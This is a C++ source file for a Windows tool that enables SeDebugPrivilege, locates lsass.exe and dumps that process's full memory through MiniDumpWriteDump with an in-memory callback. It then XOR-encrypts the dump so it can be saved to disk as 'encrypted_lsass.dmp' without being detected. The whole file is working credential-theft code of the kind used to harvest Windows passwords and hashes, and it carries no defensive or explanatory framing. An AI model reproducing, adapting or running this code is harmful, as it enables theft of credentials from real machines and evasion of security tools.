#include <iostream>
#include <windows.h>
#include <tlhelp32.h> 
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")

using namespace std;

// Buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

bool IsProcessElevated() {
    BOOL isElevated;
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        cerr << "Failed to open process token. Error: " << GetLastError() << endl;
        return false;
    }
    TOKEN_ELEVATION elevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        cerr << "Failed to get token elevation info. Error: " << GetLastError() << endl;
        CloseHandle(hToken);
        return false;
    }
    isElevated = elevation.TokenIsElevated;
    return isElevated;
}
DWORD FindProcessId(const wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wcerr << L"CreateToolhelp32Snapshot failed. Error: " << GetLastError() << endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    else {
        wcerr << L"Process32First failed. Error: " << GetLastError() << endl;
    }

    CloseHandle(hSnapshot);
    return pid;
}
bool EnablePrivilege(LPCTSTR privilegeName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "The privilege '" << privilegeName << "' is not held by the process." << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

BOOL CALLBACK minidumpCallback(
    __in     PVOID callbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType)
    {
    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;

        // Gets called for each lsass process memory read operation
    case IoWriteAllCallback:
        callbackOutput->Status = S_OK;

        // A chunk of minidump data that's been jus read from lsass. 
        source = callbackInput->Io.Buffer;

        // Calculate location of where we want to store this part of the dump.
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

        // Size of the chunk of minidump that's just been read.
        bufferSize = callbackInput->Io.BufferBytes;
        bytesRead += bufferSize;

        RtlCopyMemory(destination, source, bufferSize);

        break;

    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;

    default:
        return true;
    }
    return TRUE;
}


bool DumpLsassMemory() {
   
    DWORD lsassPid = FindProcessId(L"lsass.exe");
    if (lsassPid == 0) {
        std::wcerr << L"LSASS process not found" << std::endl;
        return false;
    }
   
    
    // Set up minidump callback
    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = &minidumpCallback;
    callbackInfo.CallbackParam = NULL;










    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (hProcess == NULL) {
        std::wcerr << L"Failed to open LSASS process. Error: " << GetLastError() << std::endl;
        return false;
    }
    
    string outputFile = "encrypted_lsass.dmp";
    wstring stemp = wstring(outputFile.begin(), outputFile.end());
    LPCWSTR outputFile_pointer = stemp.c_str();
    HANDLE hFile = CreateFileW(outputFile_pointer, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to create dump file. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }
    bool result = MiniDumpWriteDump(
        hProcess,
        lsassPid,
        NULL,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        &callbackInfo
    );

    CloseHandle(hProcess);

    if (!result) {
        std::wcerr << L"MiniDumpWriteDump failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    const BYTE xorKey = 0xAA;

    // Encrypt the dump buffer in-place
    for (DWORD i = 0; i < bytesRead; ++i) {
        ((BYTE*)dumpBuffer)[i] ^= xorKey;
    }

    DWORD bytesWritten = 0;

    if (WriteFile(hFile, dumpBuffer, bytesRead, &bytesWritten, NULL)) {
        printf("\n[+] XOR-encrypted lsass dumped from 0x%p (%d bytes)\n", dumpBuffer, bytesWritten);
    }
    else {
        wcerr << L"[-] Failed to write encrypted dump to file. Error: " << GetLastError() << endl;
    }
    return true;
}





int main() {
    wstring targetProcess = L"lsass.exe";
    DWORD pid = FindProcessId(targetProcess);

    if (IsProcessElevated()) {
        cout << "Process is running with elevated privileges (Admin/SYSTEM)." << endl;
    }
    else {
        cout << "Process is NOT elevated (Standard user rights)." << endl;
    }
    wcout << L"Process '" << targetProcess << L"' found with PID: " << pid << endl;
    if (EnablePrivilege(SE_DEBUG_NAME)) {
        std::cout << "Successfully enabled SeDebugPrivilege!!!" << std::endl;
    }
    else {
        std::cout << "Failed to enable SeDebugPrivilege." << std::endl;
    }
    if (DumpLsassMemory()) {
        std::wcout << L"+ Successfully dumped LSASS memory to: "  << std::endl;
    }
    else {
        std::wcout << L"- Failed to dump LSASS memory" << std::endl;
    }
    Sleep(3000);
    return 0;
}







